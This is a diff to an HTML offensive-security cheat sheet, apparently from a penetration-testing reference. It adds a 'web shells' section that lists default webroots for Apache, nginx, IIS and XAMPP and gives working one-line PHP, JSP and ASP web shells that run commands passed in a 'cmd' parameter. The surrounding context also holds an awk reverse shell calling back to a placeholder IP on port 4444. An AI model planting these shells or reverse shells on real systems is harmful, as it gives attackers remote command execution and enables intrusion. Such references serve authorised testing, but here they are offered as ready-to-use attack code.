@@ -170,6 +170,32 @@ xhost +&lt;target_IP&gt;
 <div class="highlight"><pre class="highlight shell"><code><span class="nb">awk</span> <span class="s1">'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/4444"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
 </code></pre></div>
 
+<h2>web shells</h2>
+
+<p>default webroots for each web servers:</p>
+
+<ul>
+<li>apache: <code>/var/www/html/</code></li>
+<li>nginx: <code>/usr/local/nginx/html/</code></li>
+<li>IIS: <code>c:\inetpub\wwwroot\</code></li>
+<li>XAMPP: <code>C:\xampp\htdocs\</code></li>
+</ul>
+
+<h3>php</h3>
+
+<div class="highlight"><pre class="highlight php"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+
+<h3>jsp</h3>
+
+<div class="highlight"><pre class="highlight jsp"><code><span class="nt">&lt;%</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span> <span class="nt">%&gt;</span>
+</code></pre></div>
+
+<h3>asp</h3>
+
+<div class="highlight"><pre class="highlight plaintext"><code>&lt;% eval request("cmd") %&gt;
+</code></pre></div>
+
 <h2>references</h2>
 
 <ul>
